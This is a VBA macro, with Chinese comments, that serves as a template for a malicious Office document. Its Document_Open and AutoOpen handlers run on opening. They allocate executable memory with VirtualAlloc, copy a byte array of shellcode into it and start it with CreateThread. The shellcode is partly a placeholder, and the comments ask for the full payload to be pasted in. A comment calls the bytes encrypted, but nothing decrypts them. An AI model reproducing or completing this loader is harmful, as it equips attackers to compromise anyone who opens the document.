Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function mymacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    ' 加密后的 shellcode（以十进制数组形式表示）
    buf = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, _
                44, 32, 193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, _
                73, 24, 227, 58, 73, 139, 52, 139, 1, 214, 49, 255, 172, 193, 40, 150, 57, 196, 75, 189, 77, 97, 95, 106, 121, 50, 2, 232, 34, 167, 248, _
                41, 214, 73, 164, 243, 255, 233, 82, 158, 146, 174, 3, 89, 164, 215, 100, 36, 142, 213, 140, 38, 60, 86, 118, 60, 52, 129, 245, 54, 49, _
                44, 113, 236, 2, 0, 0, 0, 0, 0) ' 这里请将完整的 shellcode 填入

    ' 分配内存
    addr = VirtualAlloc(0, UBound(buf) + 1, &H3000, &H40)
    
    ' 将 shellcode 复制到分配的内存中
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    ' 创建线程以执行 shellcode
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    mymacro
End Sub

Sub AutoOpen()
    mymacro
End Sub
